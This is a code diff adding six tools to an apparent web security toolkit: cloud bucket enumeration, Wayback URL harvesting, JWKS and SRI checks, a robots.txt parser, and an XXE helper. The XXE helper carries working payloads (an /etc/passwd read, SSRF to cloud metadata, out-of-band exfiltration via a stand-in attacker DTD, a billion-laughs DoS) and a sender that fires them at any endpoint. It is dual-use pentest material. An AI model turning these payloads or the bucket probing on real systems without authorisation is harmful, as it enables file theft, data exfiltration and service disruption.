@@ -627,6 +627,13 @@ const UNIVERSAL_TOOLS = [
   { id:"mixed-content",  name:"Mixed Content Scanner", icon:"⚠️", cat:"Web", desc:"Find insecure http:// resources loaded by an https:// page (scripts, styles, images, forms).", feat:["active/passive","http on https"] },
   { id:"dev-utils",      name:"Dev Utilities",     icon:"🧮", cat:"Crypto", desc:"Epoch↔date, UUID generate/inspect, base converter and a live regex tester.", feat:["epoch","uuid","regex","base"] },
   { id:"cache-probe",    name:"Cache Poisoning Probe", icon:"🗄️", cat:"Offense", desc:"Inject unkeyed headers (X-Forwarded-Host/Scheme) and detect reflection — a web cache poisoning indicator.", feat:["unkeyed input","X-Forwarded-Host","reflection"] },
+  // --- wave 6 ---
+  { id:"bucket-finder",  name:"Cloud Bucket Finder", icon:"🪣", cat:"Recon", desc:"Hunt for public S3/GCS/Azure buckets from a keyword and flag listable or access-denied storage.", feat:["S3/GCS/Azure","listable","permutations"] },
+  { id:"wayback",        name:"Wayback Recon",     icon:"🕰️", cat:"Recon", desc:"Pull a domain's historical URLs from the Wayback Machine CDX API and surface juicy paths and parameters.", feat:["archived URLs","params","old endpoints"] },
+  { id:"xxe-helper",     name:"XXE Helper",        icon:"📜", cat:"Offense", desc:"Generate XXE payloads (file read, SSRF, OOB exfil, parameter entities) and send test XML to an endpoint.", feat:["file read","OOB exfil","tester"] },
+  { id:"jwks-inspector", name:"JWKS Inspector",    icon:"🧷", cat:"Crypto", desc:"Fetch and parse a JWKS endpoint — list keys with kid/alg/use and compute RFC7638 thumbprints.", feat:["kid/alg","thumbprint","RSA/EC"] },
+  { id:"sri-checker",    name:"SRI Checker",       icon:"🔗", cat:"Web", desc:"Find cross-origin scripts and styles loaded without Subresource Integrity — a supply-chain risk.", feat:["integrity","third-party","supply chain"] },
+  { id:"txt-parser",     name:"robots / security.txt", icon:"🤖", cat:"Recon", desc:"Fetch and parse robots.txt, security.txt and sitemap.xml — disallowed paths often reveal hidden endpoints.", feat:["disallow paths","contacts","sitemap"] },
 ];
 
 // Desktop-only factory — invoked ONLY when Platform.mode === "desktop".
@@ -3465,6 +3472,209 @@ Impl["cache-probe"] = (root) => {
   root.append(
     UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Probe", run, "primary"))),
     UIKit.panel("Report", null, o.node));
+};
+
+/* ===================== CLOUD BUCKET FINDER ===================== */
+Impl["bucket-finder"] = (root) => {
+  const kw = UIKit.field("Keyword / company", { placeholder: "acme", mono: true });
+  const o = UIKit.out();
+  const tbody = el("tbody", {});
+  const tbl = el("table", { class: "tbl" }, el("thead", {}, el("tr", {}, el("th", {}, "bucket URL"), el("th", {}, "status"), el("th", {}, "result"))), tbody);
+  const SUFFIX = ["", "-backup", "-backups", "-assets", "-static", "-media", "-uploads", "-dev", "-prod", "-staging", "-data", "-logs", "-public", "-private", "-files", "-cdn", "-images", "-test"];
+  const run = async () => {
+    o.clear(); tbody.innerHTML = "";
+    const k = kw.input.value.trim().toLowerCase().replace(/[^a-z0-9\-]/g, "");
+    if (!k) return o.line("enter a keyword", "err");
+    const names = [...new Set(SUFFIX.flatMap(s => [k + s, s.replace(/^-/, "") + "-" + k]).filter(n => n && !n.startsWith("-")))];
+    const urls = [];
+    names.forEach(n => { urls.push("https://" + n + ".s3.amazonaws.com/"); urls.push("https://storage.googleapis.com/" + n + "/"); urls.push("https://" + n + ".blob.core.windows.net/?comp=list"); });
+    o.line("probing " + urls.length + " candidate buckets…", "dim");
+    const pool = makePool(); let hits = 0;
+    await pool.run(urls, 8, async (u) => {
+      try {
+        const r = await Net.fetchURL(u); const body = await r.text().catch(() => "");
+        let result = "", sev = "muted";
+        if (/ListBucketResult|<Contents>|EnumerationResults|<Blobs>/.test(body)) { result = "⚠ PUBLIC / listable"; sev = "sev-crit"; hits++; }
+        else if (/AccessDenied|<Code>AccessDenied|AuthenticationFailed/.test(body) || r.status === 403) { result = "exists (private)"; sev = "sev-low"; hits++; }
+        else if (r.status === 200) { result = "200 (check manually)"; sev = "sev-med"; hits++; }
+        else return;
+        tbody.appendChild(el("tr", {}, el("td", {}, u), el("td", {}, String(r.status)), el("td", { class: sev }, result)));
+      } catch {}
+    });
+    o.line(hits ? "⚠ " + hits + " interesting bucket(s)" : "no buckets responded (cross-origin reads need a CORS proxy)", hits ? "err" : "warn");
+    History.add("Bucket Finder", k + " · " + hits);
+  };
+  root.append(
+    UIKit.panel("Keyword", null, kw.wrap, el("div", { class: "row" }, UIKit.btn("Hunt", run, "primary"), el("span", { class: "hint" }, "S3 / Google Cloud Storage / Azure Blob name permutations"))),
+    UIKit.panel("Log", null, o.node),
+    UIKit.panel("Buckets", null, el("div", { style: "max-height:320px;overflow:auto" }, tbl)));
+};
+
+/* ===================== WAYBACK RECON ===================== */
+Impl["wayback"] = (root) => {
+  const dom = UIKit.field("Domain", { placeholder: "example.com", mono: true });
+  const limit = UIKit.field("Max URLs", { type: "number", value: "500", min: "50", max: "5000" });
+  const o = UIKit.out();
+  const JUICY = /\?|\.(?:json|xml|sql|bak|old|zip|env|log|config|yml|yaml|txt|php|asp|jsp)(?:$|\?)|\/(?:api|admin|graphql|upload|backup|debug|internal|private|v\d)\//i;
+  const run = async () => {
+    o.clear();
+    const d = dom.input.value.trim().replace(/^https?:\/\//, "").replace(/\/.*$/, "");
+    if (!d) return o.line("enter a domain", "err");
+    o.line("querying the Wayback Machine CDX API…", "dim");
+    const api = "https://web.archive.org/cdx/search/cdx?url=" + encodeURIComponent(d) + "/*&output=json&fl=original&collapse=urlkey&limit=" + (clamp(+limit.input.value || 500, 50, 5000));
+    let rows;
+    try { rows = await (await fetch(api)).json(); } catch (e) { return o.line("CDX query failed: " + e.message, "err"); }
+    const urls = (rows || []).slice(1).map(r => r[0]);
+    if (!urls.length) return o.line("no archived URLs found", "warn");
+    const juicy = urls.filter(u => JUICY.test(u));
+    o.line(urls.length + " archived URLs (" + juicy.length + " interesting)", "ok"); o.line("");
+    o.line("INTERESTING", "k"); (juicy.length ? juicy : urls).slice(0, 200).forEach(u => o.line("  " + u, juicy.length ? "warn" : "dim"));
+    History.add("Wayback", d + " · " + urls.length + " urls");
+  };
+  root.append(
+    UIKit.panel("Domain", null, el("div", { class: "toolbar" }, dom.wrap, limit.wrap), el("div", { class: "row" }, UIKit.btn("Fetch archive", run, "primary"))),
+    UIKit.panel("URLs", UIKit.copyBtn(() => o.node.textContent), o.node));
+  dom.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
+};
+
+/* ===================== XXE HELPER ===================== */
+const XXE_PAYLOADS = {
+  "File read (classic)": '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<r>&xxe;</r>',
+  "File read (PHP base64)": '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=index.php">]>\n<r>&xxe;</r>',
+  "SSRF via XXE": '<?xml version="1.0"?>\n<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<r>&xxe;</r>',
+  "OOB exfil (param entity)": '<?xml version="1.0"?>\n<!DOCTYPE r [\n<!ENTITY % p SYSTEM "http://ATTACKER/evil.dtd">\n%p;\n]>\n<r>&exfil;</r>',
+  "Billion laughs (DoS — caution)": '<?xml version="1.0"?>\n<!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">]>\n<lolz>&lol3;</lolz>',
+};
+Impl["xxe-helper"] = (root) => {
+  const attacker = UIKit.field("Attacker host (for OOB)", { placeholder: "attacker.test", mono: true });
+  const list = el("div", {});
+  const buildList = () => {
+    list.innerHTML = "";
+    for (const [name, pl] of Object.entries(XXE_PAYLOADS)) {
+      const payload = pl.replace(/ATTACKER/g, attacker.input.value.trim() || "ATTACKER");
+      list.appendChild(el("div", { class: "list-row" }, el("div", { class: "lr-main" }, el("div", { class: "lr-title" }, name), el("code", { class: "lr-sub", style: "white-space:pre-wrap;word-break:break-all" }, payload)), UIKit.copyBtn(payload)));
+    }
+  };
+  attacker.input.addEventListener("input", buildList); buildList();
+  // tester
+  const url = UIKit.field("Test endpoint (accepts XML)", { placeholder: "https://site.com/api/xml", mono: true });
+  const sel = UIKit.select("Payload", Object.keys(XXE_PAYLOADS));
+  const o = UIKit.out();
+  const send = async () => {
+    o.clear();
+    if (!/^https?:\/\//.test(url.input.value.trim())) return o.line("enter the endpoint URL", "err");
+    const payload = XXE_PAYLOADS[sel.input.value].replace(/ATTACKER/g, attacker.input.value.trim() || "attacker.test");
+    try {
+      const r = await HttpKit.send({ method: "POST", url: url.input.value.trim(), headers: "Content-Type: application/xml", body: payload });
+      o.line("HTTP " + r.status + " (" + r.size + " bytes)", "dim");
+      if (/root:.*:0:0:|daemon:|\/bin\/(?:ba)?sh/.test(r.text)) o.line("⚠ /etc/passwd content detected — XXE file read CONFIRMED", "err");
+      else if (/ami-id|instance-id|computeMetadata/.test(r.text)) o.line("⚠ cloud metadata leaked via XXE SSRF", "err");
+      o.set((o.node.textContent || "") + "\n" + r.text.slice(0, 3000));
+    } catch (e) { o.line("request failed: " + e.message + " (CORS proxy may be needed)", "err"); }
+  };
+  root.append(
+    UIKit.panel("Payloads", null, attacker.wrap, list),
+    UIKit.panel("Tester", null, el("div", { class: "toolbar" }, url.wrap, sel.wrap), el("div", { class: "row" }, UIKit.btn("Send XML", send, "primary")), o.node));
+};
+
+/* ===================== JWKS INSPECTOR ===================== */
+async function jwkThumbprint(k) {
+  let canon;
+  if (k.kty === "RSA") canon = `{"e":"${k.e}","kty":"RSA","n":"${k.n}"}`;
+  else if (k.kty === "EC") canon = `{"crv":"${k.crv}","kty":"EC","x":"${k.x}","y":"${k.y}"}`;
+  else if (k.kty === "oct") canon = `{"k":"${k.k}","kty":"oct"}`;
+  else return "n/a";
+  const h = await crypto.subtle.digest("SHA-256", Bytes.enc(canon));
+  return btoa(String.fromCharCode(...new Uint8Array(h))).replace(/\+/g, "-").replace(/\//g, "_").replace(/=+$/, "");
+}
+Impl["jwks-inspector"] = (root) => {
+  const url = UIKit.field("JWKS URL", { placeholder: "https://site.com/.well-known/jwks.json", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    let u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter the JWKS URL", "err");
+    let data;
+    try { data = JSON.parse(await (await Net.fetchURL(u)).text()); } catch (e) { return o.line("fetch/parse failed: " + e.message, "err"); }
+    const keys = data.keys || (data.kty ? [data] : []);
+    if (!keys.length) return o.line("no keys found", "warn");
+    o.line(keys.length + " key(s)", "ok"); o.line("");
+    for (const k of keys) {
+      o.line("kid : " + (k.kid || "(none)"), "k");
+      o.line("  kty=" + k.kty + " alg=" + (k.alg || "?") + " use=" + (k.use || "?") + (k.crv ? " crv=" + k.crv : ""), "dim");
+      if (k.n) o.line("  n=" + k.n.slice(0, 48) + "…", "dim");
+      try { o.line("  thumbprint(SHA-256): " + await jwkThumbprint(k), "v"); } catch {}
+      o.line("");
+    }
+    o.line("tip: pair a kid here with the JWT Attack Lab for confusion/forgery tests", "dim");
+    History.add("JWKS Inspector", u + " · " + keys.length + " key(s)");
+  };
+  root.append(
+    UIKit.panel("Endpoint", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Inspect", run, "primary"))),
+    UIKit.panel("Keys", null, o.node));
+};
+
+/* ===================== SRI CHECKER ===================== */
+Impl["sri-checker"] = (root) => {
+  const url = UIKit.field("Page URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    const u = url.input.value.trim();
+    if (!/^https?:\/\//.test(u)) return o.line("enter a full URL", "err");
+    let html; try { html = await (await Net.fetchURL(u)).text(); } catch (e) { return o.line("fetch failed: " + e.message, "err"); }
+    const origin = new URL(u).host;
+    const doc = new DOMParser().parseFromString(html, "text/html");
+    const res = [...doc.querySelectorAll("script[src],link[rel=stylesheet][href]")];
+    let risky = 0, ok = 0;
+    o.line("CROSS-ORIGIN RESOURCES", "k");
+    res.forEach(n => {
+      const src = n.getAttribute("src") || n.getAttribute("href"); let host; try { host = new URL(src, u).host; } catch { return; }
+      if (host === origin) return; // first-party
+      const hasSRI = n.hasAttribute("integrity");
+      if (hasSRI) { ok++; o.line("✓ " + src.slice(0, 80), "ok"); }
+      else { risky++; o.line("⚠ no integrity: " + src.slice(0, 80), "warn"); }
+    });
+    if (!risky && !ok) o.line("no cross-origin scripts/styles found", "dim");
+    o.line(""); o.line(risky ? "⚠ " + risky + " third-party resource(s) without SRI — supply-chain risk" : "✓ all third-party resources use SRI", risky ? "err" : "ok");
+    History.add("SRI Checker", u + " · " + risky + " missing");
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Check", run, "primary"))),
+    UIKit.panel("Report", null, o.node));
+};
+
+/* ===================== robots / security.txt PARSER ===================== */
+Impl["txt-parser"] = (root) => {
+  const url = UIKit.field("Site URL", { placeholder: "https://your-site.com", value: "https://", mono: true });
+  const o = UIKit.out();
+  const run = async () => {
+    o.clear();
+    let base = url.input.value.trim();
+    if (!/^https?:\/\//.test(base)) return o.line("enter a full URL", "err");
+    base = base.replace(/\/+$/, "") + "/";
+    const get = async (p) => { try { const r = await Net.fetchURL(base + p); return r.status < 400 ? await r.text() : null; } catch { return null; } };
+    // robots
+    o.line("robots.txt", "k");
+    const robots = await get("robots.txt");
+    if (!robots) o.line("not found / unreadable", "dim");
+    else { const dis = [...robots.matchAll(/Disallow:\s*(\S+)/gi)].map(m => m[1]); const maps = [...robots.matchAll(/Sitemap:\s*(\S+)/gi)].map(m => m[1]); o.line(dis.length + " Disallow entries (often hidden paths):", dis.length ? "warn" : "dim"); [...new Set(dis)].slice(0, 60).forEach(d => o.line("  ⚠ " + d, "warn")); maps.forEach(m => o.line("  sitemap: " + m, "v")); }
+    // security.txt
+    o.line(""); o.line("security.txt", "k");
+    const sec = await get(".well-known/security.txt") || await get("security.txt");
+    if (!sec) o.line("not found", "dim");
+    else ["Contact", "Expires", "Policy", "Encryption", "Acknowledgments", "Canonical"].forEach(f => { const m = sec.match(new RegExp("^" + f + ":\\s*(.+)$", "im")); if (m) o.line("  " + f + ": " + m[1], "v"); });
+    // sitemap
+    o.line(""); o.line("sitemap.xml", "k");
+    const sm = await get("sitemap.xml");
+    if (!sm) o.line("not found", "dim");
+    else { const locs = [...sm.matchAll(/<loc>([^<]+)<\/loc>/gi)].map(m => m[1]); o.line(locs.length + " URLs listed", "ok"); locs.slice(0, 40).forEach(l => o.line("  " + l, "dim")); }
+    History.add("robots/security.txt", base);
+  };
+  root.append(
+    UIKit.panel("Target", null, url.wrap, el("div", { class: "row" }, UIKit.btn("Fetch & parse", run, "primary"))),
+    UIKit.panel("Report", null, o.node));
+  url.input.addEventListener("keydown", e => { if (e.key === "Enter") run(); });
 };
 
 /* ===================== HISTORY (shared) ===================== */
